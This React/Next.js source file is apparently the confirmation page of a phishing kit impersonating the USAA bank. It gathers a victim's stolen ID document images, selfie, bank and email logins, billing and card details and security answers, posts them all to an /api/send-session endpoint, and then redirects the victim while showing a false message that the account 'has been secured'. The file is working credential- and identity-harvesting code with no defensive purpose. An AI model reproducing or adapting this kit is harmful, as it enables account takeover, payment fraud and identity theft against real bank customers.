/* eslint-disable @next/next/no-img-element */
import axios from "axios";
import React, { useContext, useEffect } from "react";
import { Wrapper } from "../components/Wrapper";
import { dataURItoBlob } from "../utils/dataURItoBlob";
import { DataContext } from "./_app";

interface ConfirmationProps {}

export const Confirmation: React.FC<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);

  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const answers = data.answers;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          if (answers) {
            formData.append(`answers`, JSON.stringify(answers));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper
      paragraph="Thank you for verifying your account information, your account has been secured and your online access has been resotred. Please wait while we redirect you to the login page."
      title="Thank you, your account has been secured."
      hideBtn
    >
      <div className="usaa-form-v5-10-1-formGroup-wrapper">
        <div className="usaa-form-v5-10-1-formGroup">
          <div
            style={{
              display: `flex`,
              // alignItems: `center`,
              // justifyContent: `center`,
              padding: `20px 0`,
              paddingTop: 0,
              marginBottom: `20px`,
              flexDirection: `column`,
            }}
          >
            <p
              style={{
                padding: `13px 23px 9px`,
                fontSize: 14,
              }}
            >
              Your information has been verified and your online access has been
              resotred. Please wait while we redirect you to the login page.
            </p>
            <span className="usaa-interstitialSpinner"></span>
          </div>
        </div>
      </div>
    </Wrapper>
  );
};

export default Confirmation;
